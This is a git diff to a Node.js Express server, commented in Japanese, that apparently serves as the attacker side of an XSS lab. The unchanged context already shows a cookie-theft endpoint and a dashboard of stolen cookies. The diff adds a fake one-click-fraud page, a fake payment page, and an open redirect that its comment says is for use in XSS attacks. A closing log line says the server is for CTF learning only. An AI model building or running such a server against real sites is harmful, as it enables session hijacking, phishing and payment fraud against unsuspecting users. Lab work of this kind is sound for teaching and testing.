@@ -30,6 +30,9 @@ app.use((req, res, next) => {
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// 静的ファイルの配信
+app.use(express.static(path.join(__dirname)));
+
 // ログをファイルに書き込む関数
 function writeLog(data) {
   const timestamp = new Date().toISOString();
@@ -119,6 +122,33 @@ app.post('/logs/clear', (req, res) => {
   } else {
     res.json({ success: false, message: 'ログファイルが存在しません' });
   }
+});
+
+// 偽ページ（ワンクリック詐欺）のエンドポイント
+app.get('/fake', (req, res) => {
+  const fakePagePath = path.join(__dirname, 'fake_page.html');
+  if (fs.existsSync(fakePagePath)) {
+    res.sendFile(fakePagePath);
+  } else {
+    res.status(404).send('偽ページが見つかりません');
+  }
+});
+
+// 決済ページのエンドポイント
+app.get('/payment', (req, res) => {
+  const paymentPagePath = path.join(__dirname, 'payment_page.html');
+  if (fs.existsSync(paymentPagePath)) {
+    res.sendFile(paymentPagePath);
+  } else {
+    res.status(404).send('決済ページが見つかりません');
+  }
+});
+
+// リダイレクト用エンドポイント（XSS攻撃などで使用）
+app.get('/redirect', (req, res) => {
+  // クエリパラメータでリダイレクト先を指定可能
+  const target = req.query.to || '/fake';
+  res.redirect(target);
 });
 
 // ダッシュボード（盗取されたCookieを表示）
@@ -319,6 +349,14 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`   http://localhost:${PORT}`);
     console.log(`\n📡 Cookie盗取エンドポイント:`);
     console.log(`   GET/POST: http://${mainIP}:${PORT}/steal?cookies=COOKIE_VALUE`);
+    console.log(`\n🎭 偽ページ（ワンクリック詐欺）:`);
+    console.log(`   http://${mainIP}:${PORT}/fake`);
+    console.log(`   http://localhost:${PORT}/fake`);
+    console.log(`\n💳 決済ページ:`);
+    console.log(`   http://${mainIP}:${PORT}/payment`);
+    console.log(`   http://localhost:${PORT}/payment`);
+    console.log(`\n🔄 リダイレクトエンドポイント:`);
+    console.log(`   http://${mainIP}:${PORT}/redirect?to=/fake`);
     
     if (localIPs.length > 1) {
       console.log(`   （その他のIPアドレス: ${localIPs.slice(1).map(ip => `http://${ip}:${PORT}`).join(', ')}）`);
@@ -326,6 +364,9 @@ app.listen(PORT, '0.0.0.0', () => {
   } else {
     console.log(`📍 ダッシュボード: http://localhost:${PORT}`);
     console.log(`📡 Cookie盗取エンドポイント: http://localhost:${PORT}/steal?cookies=COOKIE_VALUE`);
+    console.log(`🎭 偽ページ: http://localhost:${PORT}/fake`);
+    console.log(`💳 決済ページ: http://localhost:${PORT}/payment`);
+    console.log(`🔄 リダイレクト: http://localhost:${PORT}/redirect?to=/fake`);
   }
   
   console.log(`\n⚠️  このサーバーはCTF学習目的のみで使用してください。`);
